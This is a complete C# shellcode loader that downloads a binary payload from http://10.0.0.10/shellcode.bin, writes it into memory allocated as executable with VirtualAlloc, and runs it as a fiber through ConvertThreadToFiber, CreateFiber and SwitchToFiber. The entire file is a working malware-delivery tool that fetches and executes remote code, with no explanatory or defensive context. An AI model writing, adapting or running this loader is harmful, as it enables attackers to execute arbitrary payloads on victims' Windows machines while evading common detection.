using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ConvertThreadToFiber
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ConvertThreadToFiber(IntPtr.Zero);

            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr lpFiber = CreateFiber(shellcode.Length, addr, IntPtr.Zero);

            SwitchToFiber(lpFiber);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateFiber(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        static extern void SwitchToFiber(IntPtr lpFiber);

    }
}

